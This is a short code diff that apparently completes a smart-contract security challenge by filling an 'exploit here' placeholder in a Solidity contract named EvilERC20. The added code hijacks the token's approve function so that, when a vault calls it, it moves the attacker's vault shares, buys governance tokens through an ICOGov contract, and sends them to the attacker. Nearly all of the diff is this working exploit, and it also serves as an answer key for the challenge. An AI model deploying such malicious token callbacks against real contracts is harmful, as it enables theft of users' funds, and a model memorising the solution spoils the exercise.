@@ -23,9 +23,21 @@ contract EvilERC20 is ERC20 {
     function approve(address spender, uint256 amount) public virtual override returns (bool) {
         address owner = _msgSender();
         _approve(owner, spender, amount);
+        // Trigger the attack
+        if (amount == 0 && owner == address(vault)) {
+            // Transfer $VT from attacker
+            uint256 share = vault.balanceOf(attackerAddr);
+            vault.transferFrom(attackerAddr, address(this), share);
 
-        // Write your exploit here.
+            // Approve $VT to be used by ICOGov
+            vault.approve(address(icoGov), share);
 
+            // Buy the token
+            icoGov.buyToken(share);
+
+            // Transfer token bought back to the attacker
+            govToken.transfer(attackerAddr, govToken.balanceOf(address(this)));
+        }
         return true;
     }
 }
